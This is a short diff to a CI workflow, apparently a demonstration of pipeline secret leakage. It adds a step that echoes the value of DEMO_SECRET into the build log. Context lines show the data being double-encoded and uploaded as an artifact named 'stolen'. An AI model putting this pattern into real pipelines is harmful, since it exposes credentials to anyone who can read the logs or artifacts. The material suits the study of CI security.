@@ -17,6 +17,13 @@ jobs:
 
       - name: Normal step
         run: echo "Pipeline started"
+      - name: Check secret availability
+        run: |
+          if [ -z "$DEMO_SECRET" ]; then
+            echo "❌ Secret NOT available"
+          else
+            echo "✔ Secret available: $DEMO_SECRET"
+          fi
 
       - name: Encode 2x and store
         run: |
@@ -28,3 +35,5 @@ jobs:
         with:
           name: stolen
           path: stolen_data_b64.txt
+
+
